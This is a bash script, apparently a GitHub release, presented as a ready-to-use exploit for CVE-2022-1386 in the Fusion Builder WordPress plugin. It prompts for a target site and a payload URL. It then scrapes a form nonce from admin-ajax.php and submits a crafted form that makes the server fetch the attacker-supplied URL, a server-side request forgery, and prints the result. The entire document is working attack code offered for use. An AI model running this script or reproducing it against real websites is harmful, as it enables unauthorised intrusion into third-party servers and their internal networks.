#/bin/sh
# Single Target exploit
# Created By IM-Hanzou
# Using jq. install first!
cat << "EOF"
   ____     __        _______          
  / __/_ __/ /  __ __/ ___/ /_____ ____
 / _// // / _ \/ // / /__/  '_/ -_) __/
/_/  \_,_/_.__/\_,_/\___/_/\_\\__/_/                                                                                                                                                   
EOF
printf "CVE-2022-1386 | Single Target Exploiter\n\n"
printf "Created By Im-Hanzou
Github : im-hanzou\n\n"

read -p "Target URL (use http/https): " target
read -p "Payload URL (use http/https): " payload 

if [[ $(curl -s -k $target"/wp-admin/admin-ajax.php" --compressed --data "action=fusion_form_update_view") =~ "fusion" ]]; then
	fusionid=$(curl -s -k $target"/wp-admin/admin-ajax.php" --compressed --data "action=fusion_form_update_view" | grep -oP '(?<=id="fusion-form-nonce-0" name="fusion-form-nonce-0" value=")[^"]+')
	exploit=$(curl --compressed -s -k --data "email=example@example.com&fusion_privacy_store_ip_ua=false&fusion_privacy_expiration_interval=48&privacy_expiration_action=ignore&fusion-form-nonce-0=$fusionid&fusion-fields-hold-private-data=&action=fusion_form_submit_form_to_url&fusion_form_nonce=$fusionid&form_id=0&post_id=0&field_labels={\"email\":\"Email+address\"}&hidden_field_names=[]&fusionAction=$payload&fusionActionMethod=GET" $target'/wp-admin/admin-ajax.php' | jq -r '.info')
		printf "\nResult: $exploit\n"
else
		printf "\nWebsite Not Vulnerable\n"
fi
